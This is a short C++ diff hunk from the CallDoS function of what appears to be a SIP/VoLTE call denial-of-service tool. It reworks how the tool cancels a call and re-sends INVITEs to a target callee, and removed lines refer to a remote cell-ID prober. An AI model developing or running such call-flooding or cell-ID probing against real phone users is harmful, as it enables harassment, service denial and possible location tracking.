@@ -853,27 +853,14 @@ void Application::CallDoS(pollfd& pfd, int nReady, const std::string& calleeId) 
           if (expobackoff || util::context.unavailabilityEval) {
        
             session.state.sessionProgressCount[session.state.calleeId] = 0;
-     
-            session.setSipState(SipState::INVITE, "threshold reached, rollover to next INVITE");
+
             if (util::context.verbose > 1) std::cout << "SEND CANCEL" << std::endl;
             session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(front.cancel.data()), front.cancel.size()));
-
-            if (util::context.remoteCellIDProber) {
-              if (util::context.verbose) std::cout << "\nLaunch call dos to " << calleeId << std::endl;
-              if (util::context.verbose > 1) std::cout << "SEND INVITE" << std::endl;
-              prepareFreshInvite(back);
-              armInviteTiming(back.invite);
-              session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(back.invite.data()), back.invite.size()));
-              session.setSipState(SipState::INVITE, "fresh INVITE sent after rollover");
-            }
-
-            // Create new sip call session
-            sips.front().setBranch();
-            sips.front().setCallId();
-            sips.front().setFromTag();
-            std::swap(front, back);
-
-                
+            // Use two-phase boundary to avoid overlapping old/new INVITE legs:
+            // wait for terminate response (or timeout fallback) before fresh INVITE.
+            session.state.retryCancelPending = false;
+            session.state.retryInvitePending = true;
+            session.setSipState(SipState::REQUESTERMINATE, "threshold reached, wait terminate before next INVITE");
           }
           break;
         case SipState::CANCEL:
